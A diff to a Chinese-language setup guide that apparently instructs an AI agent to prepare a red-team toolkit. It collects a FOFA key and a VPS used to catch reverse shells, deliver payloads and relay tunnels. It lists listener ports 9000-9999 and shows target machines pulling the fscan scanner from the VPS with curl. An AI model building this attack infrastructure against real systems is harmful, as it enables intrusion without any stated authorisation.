@@ -6,6 +6,10 @@ role: plan
 enabled: true
 ---
 
+> **路径约定**：下文的 `${TOOLKIT}` 指工具根目录 `$DSH_HOME/redteam/toolkit`（可在演练台「环境适配」里改）。
+> 工具一律放 `${TOOLKIT}/<工具名>/`，不要散落到 PATH 或 `~/.local/bin`。
+> 缺什么工具、装到哪、官方获取命令：跑 `redteam_preflight`，或看仓库 `docs/TOOLKIT.md`。
+
 # 首次使用引导（把环境一次配齐）
 
 **触发条件**（满足任一即执行本技能，不要跳过）：
@@ -35,7 +39,7 @@ WebShell / 反弹 Shell / 横向移动 / 未授权利用）。原因：npm 的�
 | 要什么 | 为什么必须 | 给到哪 | 没有会怎样 |
 | --- | --- | --- | --- |
 | **FOFA_KEY** | 资产测绘（`fofa-recon`）靠它铺开单位互联网资产面；没有就只能靠 crt.sh + 子域枚举，**边缘资产与未备案资产会大量漏掉** | 环境变量 `FOFA_KEY`，或写进 `$DSH_HOME/.env`（脚本会代写） | 测绘能力降级：找不全资产 → 后面四个阶段都受影响 |
-| **VPS 登录方式**（`user@ip` + 私钥路径） | 反弹 Shell 必须落到**公网可控主机**上；载荷投递、隧道中转也依赖它 | `REDTEAM_VPS_HOST`（`用户@主机`）/ `REDTEAM_VPS_KEY`（私钥路径，默认 `$DSH_HOME/redteam/toolkit/vps/id_rsa`） | 拿不到服务器权限、投递不了载荷、进不了内网 |
+| **VPS 登录方式**（`user@ip` + 私钥路径） | 反弹 Shell 必须落到**公网可控主机**上；载荷投递、隧道中转也依赖它 | `REDTEAM_VPS_HOST`（`用户@主机`）/ `REDTEAM_VPS_KEY`（私钥路径，默认 `${TOOLKIT}/vps/id_rsa`） | 拿不到服务器权限、投递不了载荷、进不了内网 |
 | （可选）测绘平台 key | Quake / Hunter / ZoomEye 与 FOFA 结果差异大，交叉能多找出资产 | 环境变量，按需 | 少一路交叉验证 |
 | （可选）允许 apt 安装 | 补系统工具 | 用户自己执行 `sudo apt install …` | 相关技能降级 |
 
@@ -51,7 +55,7 @@ WebShell / 反弹 Shell / 横向移动 / 未授权利用）。原因：npm 的�
 
 ### VPS 怎么准备（要能指导用户）
 - 一台**公网可达**的 Linux VPS（1 核 1G 够用），安全组放行：`22`（SSH）、`9000-9999`（反弹 Shell 监听段）、`9100`（载荷分发）；
-- 生成/放置 SSH 私钥到 `$DSH_HOME/redteam/toolkit/vps/id_rsa`，权限必须 `chmod 600`；
+- 生成/放置 SSH 私钥到 `${TOOLKIT}/vps/id_rsa`，权限必须 `chmod 600`；
 - 确认连通：`ssh -i <私钥> <user>@<ip> 'echo ok'`；
 - **载荷分发服务**：VPS 上 `~/payload` 目录 + `python3 -m http.server 9100`（tmux 常驻），
   目标机可 `curl http://<ip>:9100/fscan` 直接拉工具。
@@ -65,7 +69,7 @@ WebShell / 反弹 Shell / 横向移动 / 未授权利用）。原因：npm 的�
 curl -s "https://fofa.info/api/v1/info/my?key=$FOFA_KEY" | grep -o '"error":[a-z]*'
 
 # 2) VPS 可达（载荷服务是否在跑由工具箱的体检脚本负责）
-ssh -i $DSH_HOME/redteam/toolkit/vps/id_rsa -o BatchMode=yes <user>@<ip> 'echo ok'
+ssh -i ${TOOLKIT}/vps/id_rsa -o BatchMode=yes <user>@<ip> 'echo ok'
 
 # 3) 技能注册表可见
 #    用 redteam_preflight 复核，看 available 列表里实际有哪些技能
